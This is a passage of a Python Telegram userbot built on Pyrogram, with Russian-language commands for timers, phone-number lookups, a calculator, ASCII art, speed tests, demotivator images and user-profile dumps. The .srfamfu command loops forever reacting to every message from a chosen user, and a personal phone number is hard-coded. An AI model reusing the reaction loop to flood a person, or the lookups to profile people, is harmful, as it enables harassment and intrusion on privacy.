	   	message.edit(tm1)
	   	tm1 = int(tm1) - 1
	   	sleep(1)
	app.send_message(message.chat.id, 'Конец таймера')
	

@app.on_message(filters.command("test", prefixes=".") & filters.me)
def test(app, message):
    times2 = message.text.split(".test ", maxsplit=1)[1]
    tm2 = times2
    while int(tm2) > 0:
        try:
            message.edit(message.chat.id, f'{tm2}')
        except FloodWait as e:
            sleep(e.x)
            
        tm2 = int(tm2) - 1
        sleep(1)



@app.on_message(filters.command("pi", prefixes=".") & filters.me)
def phoneinfo(app, message):
    message.delete(message.chat.id)
    pi_text = message.text.split(".pi ", maxsplit=1)[1]
    pi_txt = pi_text
    pi_nomer = pi_txt.replace(" ", "")
    numb_tel_pi = phonenumbers.parse(f'{pi_nomer}')
    if pi_nomer == '+380687891388':
    	app.send_message(message.chat.id, "Ошибка - 69")
    	
    elif pi_nomer == '380687891388':
    	app.send_message(message.chat.id, "Ошибка - 69")
    
    else:
    	valid_pi = phonenumbers.is_valid_number(numb_tel_pi)
    	if valid_pi == False:
    		app.send_message(message.chat.id, 'Не известный номер')
    	elif valid_pi == True:
    		zone_tel = timezone.time_zones_for_number(numb_tel_pi)
    		operator = carrier.name_for_number(numb_tel_pi, 'eu')
    		region = geocoder.description_for_number(numb_tel_pi, 'eu')
    		app.send_message(message.chat.id, f'''Часовой пояс: {' ' .join(zone_tel)}
Оператор: {operator}
Регион: {region}
{numb_tel_pi}

Telegram: http://t.me/{pi_nomer}
Whatsapp: https://transitapp.com/redirect.html?url=whatsapp://send/?phone={pi_nomer}
Viber: https://transitapp.com/redirect.html?url=viber://chat?number={pi_nomer}''')
    	else:
    			app.send_message(message.chat.id, 'Не известная ошибка')



@app.on_message(filters.command("tl", prefixes=".")& filters.me)
def timelove(app, message):
	
	while True:
	           		try:
	           			d1 = message.text.split(".tl ", maxsplit=1)[1]
	           			d2 = d1
	           			
	           			d3 = datetime.datetime.today()
	           			d4 = datetime.datetime.strptime(d1, '%Y/%m/%d %H:%M:%S')
	           			
	           			d5 = d3 - d4
	           			d6 = f'{d5}'
	           			
	           			d7 = d6.replace('days', 'Дней')
	           			d8 = d7[:18]
	           			d9 = d8.replace('.', '')
	           			
	           			message.edit(f"{d9}")
	           		except FloodWait as e:
	           			sleep(e.x)
	           		
	           		sleep(1)


@app.on_message(filters.command("kr", prefixes=".") & filters.me)
def kalcutalor(app, message):
	
	kalcutalor1 = message.text.split(".kr ", maxsplit=1)[1]
	kalcutalor2 = kalcutalor1
	
	kalcutalor3 = eval(kalcutalor2)
	
	message.edit(f"{kalcutalor2} = {kalcutalor3}")




@app.on_message(filters.command("tlm", prefixes=".")& filters.me)
def timeloveme(app, message):
	while True:
	           		try:
	           			d1 = "2021/10/12 18:42:00"
	           			d2 = d1
	           			
	           			d3 = datetime.datetime.today()
	           			d4 = datetime.datetime.strptime(d1, '%Y/%m/%d %H:%M:%S')
	           			
	           			d5 = d3 - d4
	           			d6 = f'{d5}'
	           			
	           			d7 = d6.replace('days', 'Дней')
	           			d8 = d7[:18]
	           			d9 = d8.replace('.', '')
	           			
	           			message.edit(f"{d9}")
	           		except FloodWait as e:
	           			sleep(e.x)
	           		
	           		sleep(1)



@app.on_message(filters.command("277353", prefixes="") & filters.me)
def pasxalka(app, message):
	message.edit("пасхалка!")
	sleep(3)
	app.send_message(message.chat.id, '''⣿⣿⣿⣿⠛⠛⠉⠄⠁⠄⠄⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⠄⠄⠄⠐⠄⠄⠄⠄⠄⠄⠄⠠⣿⣿⣿⣿⣿⣿
⣿⣿⡇⠄⢀⡀⠠⠃⡐⡀⠠⣶⠄⠄⢀⣿⣿⣿⣿⣿⣿
⣿⣿⣶⠄⠰⣤⣕⣿⣾⡇⠄⢛⠃⠄⢈⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⢀⣻⠟⣻⣿⡇⠄⠧⠄⢀⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣟⢸⣻⣭⡙⢄⢀⠄⠄⠄⠈⢹⣯⣿⣿⣿⣿⣿
⣿⣿⣿⣭⣿⣿⣿⣧⢸⠄⠄⠄⠄⠄⠈⢸⣿⣿⣿⣿⣿
⣿⣿⣿⣼⣿⣿⣿⣽⠘⡄⠄⠄⠄⠄⢀⠸⣿⣿⣿⣿⣿
⡿⣿⣳⣿⣿⣿⣿⣿⠄⠓⠦⠤⠤⠤⠼⢸⣿⣿⣿⣿⣿
⡹⣧⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⢇⣓⣾⣿⣿⣿⣿⣿
⡞⣸⣿⣿⢏⣼⣶⣶⣶⣶⣤⣶⡤⠐⣿⣿⣿⣿⣿⣿⣿
⣯⣽⣛⠅⣾⣿⣿⣿⣿⣿⡽⣿⣧⡸⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡷⠹⠛⠉⠁⠄⠄⠄⠄⠄⠄⠐⠛⠻⣿⣿⣿⣿
⣿⣿⣿⠃⠄⠄⠄⠄⠄⣠⣤⣤⣤⡄⢤⣤⣤⣤⡘⠻⣿
⣿⣿⡟⠄⠄⣀⣤⣶⣿⣿⣿⣿⣿⣿⣆⢻⣿⣿⣿⡎⠝
⣿⡏⠄⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⠐
⣿⡏⣲⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣿⣿⣿⡟⣼
⣿⡠⠜⣿⣿⣿⣿⣟⡛⠿⠿⠿⠿⠟⠃⠾⠿⢟⡋⢶⣿
⣿⣧⣄⠙⢿⣿⣿⣿⣿⣿⣷⣦⡀⢰⣾⣿⣿⡿⢣⣿⣿
⣿⣿⣿⠂⣷⣶⣬⣭⣭⣭⣭⣵⢰⣴⣤⣤⣶⡾⢐⣿⣿
⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⢃⣼⣿⣿''')
	sleep(1)
	app.send_message(message.chat.id, '''⠄⠄⠄⠄⠄⠄⠄⠄⣀⣠⣤⣤⣤⣄⡀⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⣠⣿⣿⣿⡿⣿⡿⣗⢌⢳⡀⠄⠄⠄
⠄⠄⠄⠄⠄⣼⣿⡇⣿⠹⡸⡹⣷⡹⡎⣧⢳⠄⠄⠄
⠄⠄⠄⠄⠄⣿⣿⠱⡙⠰⣢⡱⢹⡇⡷⢸⢸⠄⠄⠄
⠄⠄⠄⠄⠄⢿⢸⡈⣉⣤⠠⣴⡄⡇⠁⠄⢸⠄⠄⠄
⠄⠄⠄⠄⠄⠸⡆⡃⡙⢍⣹⡿⢓⠄⠤⣐⡟⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠙⠾⠾⠮⢵⢸⡔⢷⣍⠉⠄⠄⠄⠄
⠄⠄⠄⠄⢀⣴⣾⣿⣷⡶⡋⢞⣎⣚⣭⣴⣶⣶⣤⡀
⠄⠄⠄⠄⢘⣛⣩⣾⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⣷
⠄⠄⣀⠺⣿⣿⣿⠟⣡⣾⠿⢿⣿⣿⡎⢋⠻⣿⣿⣿
⠄⠄⣉⣠⣿⣿⡏⣼⣿⠁⠶⠄⣿⣿⡇⡼⠄⠈⠛⢿
⠄⠄⣈⠻⠿⠟⢁⠘⢿⣷⣶⣾⣿⠟⡰⠃⠄⠄⠄⠄
⠄⣴⣿⣧⢻⣿⣿⣷⣦⣬⣉⣩⣴⠞⠁⠄⠄⠄⠄⠄
⠄⠘⠿⠿⢸⣿⢸⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠄
⠄⢤⡝⣧⠘⣿⢸⣿⡿⢻⣿⡿⠄⠄⠄⠄⠄⠄⠄⠄
⣜⢧⠻⣰⢇⣸⢠⣿⡅⣿⠏⣴⣧⡀⠄⠄⠄⠄⠄⠄
⠹⠢⢾⣿⣸⣿⣿⣿⢡⡏⣸⣿⣿⣷⠄⠄⠄⠄⠄⠄
⠄⣷⣦⡉⠛⠻⠿⠿⠾⠿⠿⠿⠛⢋⣁⠄⠄⠄⠄⠄
⢸⣿⣿⣿⣦⡀⠄⠄⠄⢀⣤⣶⣾⣿⣿⡆⠄⠄⠄⠄
⢸⣿⣿⣿⣿⣿⣄⠄⣾⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄
⠸⣿⣿⣿⣿⣿⣿⠄⢿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄
⠄⣿⣿⣿⣿⣿⣿⠄⠈⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄
⠄⢹⣿⣿⣿⣿⡟⠄⠄⠹⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄''')
	sleep(1)
	app.send_message(message.chat.id, '''⠄⠄⠄⠄⠸⣼⢣⢏⡴⠋⣺⣴⣷⠞⠛⢿⣿⠐⠂
⠄⠄⠄⠄⢸⢸⠄⡕⢄⢾⣿⣿⣿⣿⣿⣿⣛⣁⡇
⠄⠄⠄⠄⠈⣇⠃⡉⠉⠅⣿⣿⣿⣿⣿⣟⣍⣀⡃
⠄⠄⠄⠄⠄⣟⠷⡅⢸⣿⣬⣛⡻⠿⣿⣿⣿⡿⠃
⠄⠄⠄⠄⠄⢱⡭⠞⢻⣿⣿⣿⣿⣿⣿⠆⢰⡞⢝⡂
⠄⢀⣀⣤⣤⣶⢴⢃⣿⣿⣿⣿⡏⣿⠟⡄⣌⢷⣖⢭⣀
⣿⣿⣿⣿⣿⣿⠃⣸⣿⣿⣿⡏⢸⢣⣾⣿⡹⣾⠋⣷⠹⡀⠙⡄
⣿⣿⣿⣿⣿⡟⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠙⡣⣿⣆⣗⠄⣿⡄
⢸⣿⣿⣿⠿⡴⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢳⣌⢿⡘⢗⠻⢇⠄
⢸⣧⢩⣕⡔⡄⣿⣿⣿⣿⣷⠻⢫⣼⣿⣿⣿⣧⠘⡮⠓⣷⠠⡱⣤⠙
⠈⢣⡟⡌⠄⢳⢻⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⢏⠦⣧⢣⡟⡀⢸⡉⠉
⠿⠸⢹⣤⠄⠄⠓⡝⢿⣿⣿⠇⣿⣿⣿⠟⡥⠊⣤⠄⠞⣼⣇⠤⠓⠄
⣫⡄⢆⢀⠄⠄⠄⠈⠢⡙⢫⣾⡜⢫⠕⠋⠄⠄⠄⢀⣾⣿⡇
⣿⣿⠈⠣⣗⡀⡄⢆⢀⣨⣞⣥⣊⣀⣀⣀⣤⠴⠚⣿⣿⣿⡇''')
	sleep(1)
	app.send_message(message.chat.id, '''⠄⠄⠄⠄⠄⠄⣠⢼⣿⣷⣶⣾⡷⢸⣗⣯⣿⣶⣿⣶⡄⠄⠄⠄
⠄⠄⣀⣤⣴⣾⣿⣷⣭⣭⣭⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠄⠄
⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣧⠄⠄
⠄⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢻⣿⣿⡄⠄
⠄⢸⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⢹⣿⣿⣿⡟⢛⢻⣷⢻⣿⣧⠄
⠄⠄⣿⡏⣿⡟⡛⢻⣿⣿⣿⣿⠸⣿⣿⣿⣷⣬⣼⣿⢸⣿⣿⠄
⠄⠄⣿⣧⢿⣧⣥⣾⣿⣿⣿⡟⣴⣝⠿⣿⣿⣿⠿⣫⣾⣿⣿⡆
⠄⠄⢸⣿⣮⡻⠿⣿⠿⣟⣫⣾⣿⣿⣿⣷⣶⣾⣿⡏⣿⣿⣿⡇
⠄⠄⢸⣿⣿⣿⡇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⣿⣿⡇
⠄⠄⢸⣿⣿⣿⡇⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⠄
⠄⠄⣼⣿⣿⣿⢃⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⡇''')
	sleep(1)
	app.send_message(message.chat.id, '''⣿⣿⣿⣿⣿⣿⣿⡇⡌⡰⢃⡿⡡⠟⣠⢹⡏⣦⢸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⢰⠋⡿⢋⣐⡈⣽⠟⢀⢻⢸⡂⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣋⠴⢋⡘⢰⣄⣀⣅⣡⠌⠛⠆⣿⡄⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣶⣁⣐⠄⠹⣟⠯⢿⣷⠾⠁⠥⠃⣹⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠟⠋⡍⢴⣶⣶⣶⣤⣭⡐⢶⣾⣿⣶⡆⢨⠛⠻⣿⣿⣿
⣿⣿⣿⢏⣘⣚⣣⣾⣿⣿⣿⣿⣿⣿⢈⣿⣿⣿⣧⣘⠶⢂⠹⣿⣿
⣿⣿⠃⣾⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⡀⢿⣿⣿⣿⣿⣿⣿⡇⣿⣿
⣿⣿⡄⣿⣿⣿⣿⣿⣿⡯⠄⠄⠾⠿⠿⢦⣝⠻⣿⣿⣿⣿⠇⣿⣿
⣿⣿⣷⣜⠿⢿⣿⡿⠟⣴⣾⣿⡇⢰⣾⣦⡹⣷⣮⡙⢟⣩⣾⣿⣿
⣿⣿⣿⣿⣿⣆⢶⣶⣦⢻⣿⣿⣷⢸⣿⣿⣷⣌⠻⡷⣺⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡜⢿⣿⡎⢿⣿⣿⡬⣿⣿⣿⡏⢦⣔⠻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠎⠻⣷⡈⢿⣿⡇⢛⣻⣿⣿⢸⣿⣷⠌⡛⢿⣿
⣿⣿⣿⣿⣿⣿⡏⢰⣷⡙⢷⣌⢻⣿⣿⣿⣿⣿⢸⡿⢡⣾⣿⡶⠻
⣿⣿⣿⣿⣿⡟⣰⣶⣭⣙⠊⣿⣷⣬⣛⠻⣿⣿⠈⣴⣿⣿⣿⠃⠄
⣿⣿⣿⣿⡟⠄⠹⢿⣿⣿⣿⣤⠻⠟⠋⠡⠘⠋⢸⣿⣿⡿⠁⠄⠄
⣿⣿⣿⣿⠁⠄⠄⠄⠙⢻⣿⣿⣇⠄⠄⠄⠄⠄⣺⡿⠛⠄⠄⠄⠄
⣿⣿⣿⡏⠄⠄⠄⠄⠄⠄⠄⠉⠻⠷⠄⢠⣄⠄⠋⠄⠄⠄⠄⠄⠄
⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿⠄⠄⠄⠄⠄⠄⠄⠄''')
	sleep(1)
	app.send_message(message.chat.id, ''' ⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄ ⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥ ⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿ ⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵ ⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿ ⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁ ⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄ ⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄ ⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿ ⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿ ⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿ ⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿ ⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿ ⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿ ⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣾⣿⠿⠿⠶⠿⢿''')


@app.on_message(filters.command("st", prefixes=".") & filters.me)
def speed_tests(app, message):
     message.edit("Тестирование скорости интернета...")
     ds = st.download()
     us = st.upload()
    
     servernames = []
     st.get_servers(servernames)
    
     message.edit(f'''Download: {memoryconv.convsize(ds)}\nUpload: {memoryconv.convsize(us)}\nPing: {st.results.ping} ms''')



@app.on_message(filters.command("dem", prefixes=".") & filters.me)
def demontivator(app, message):
	dem1 = message.text.split("\n")
	dem2 = dem1[1]
	dem3 = dem1[2]
	ph_id = message.reply_to_message.photo.file_id
	dem4 = app.download_media(message=ph_id,  in_memory=False)
	print(dem4)
	dem = Demotivator(f'{dem2}', f'{dem3}') 
	dem.create(f'{dem4}', font_name="/storage/emulated/0/SUB_SUB/SUB/Times New Roman.ttf")
	app.send_photo(message.chat.id, photo='/storage/emulated/0/SUB_SUB/SUB/demresult.jpg')



@app.on_message(filters.command("fu", prefixes=".") & filters.me)
def from_users(app, message):
	print(message)
	cn1 = message.reply_to_message.from_user
	cn2 = f"{cn1}"
	cn3 = cn2.replace('"', '')
	cn4 = cn3.replace(',', '')
	cn5 = cn4.replace('{', '')
	cn6 = cn5.replace('}', '')
	cn7 = cn6.replace(' ', '')
	cn8 = cn7.replace('_:User', 'USER\n')
	cn9 = cn8.replace('_:ChatPhoto', '')
	cn10 = cn9.replace('photo:', '\nPHOTO')
	cn11 = cn10.replace(':', ': ')
	cn12 = cn11.replace('false', '❌')
	cn13 = cn12.replace('true', '✅')
	app.send_message(message.chat.id, f"{cn13}")




@app.on_message(filters.command("srfamfu", prefixes='.') & filters.me)
def send_reaction_for_all_messages_from_user(app, message):
    try:
    	srfamfu11 = message.text.split(".srfamfu ", maxsplit=1)[1]
    	srfamfu10 = f"{srfamfu11}"
    	while True:
    		for srfamfu0 in app.get_chat_history(message.chat.id):
    			srfamfu1 = srfamfu0.from_user.id
    			srfamfu2 = message.reply_to_message.from_user.id
    			srfamfu3 = srfamfu0.id
    			srtamfu4 = datetime.datetime.today()
    			srfamfu5 = srfamfu0.text
    			srtamfu6 = f"{srtamfu4}"
    			srtamfu7 = srtamfu6[11:]
    			srtamfu8 = srtamfu7.split('.')[0]
    			if srfamfu1 == srfamfu2:
    				app.send_reaction(message.chat.id, srfamfu3, f"{srfamfu10}")
    				print(f"{srtamfu8} | {srfamfu5} --> Reacted: {srfamfu10}")
    				sleep(0.1)
    except IndexError:
    	message.edit('×SUB× | [IndexError] - Вы НЕ указали реакцию после комманды\n\nПример:\n `.srfamfu ❤ `️')
    except AttributeError:
    	message.edit('×SUB× | [AttributeError] - Вы НЕ ответели на сообщение(команду нужно отправлять с оветом на сообщение)')
    except:
    	message.edit('×SUB× | [UnknownError] - Не известная ошибка')



app.run()
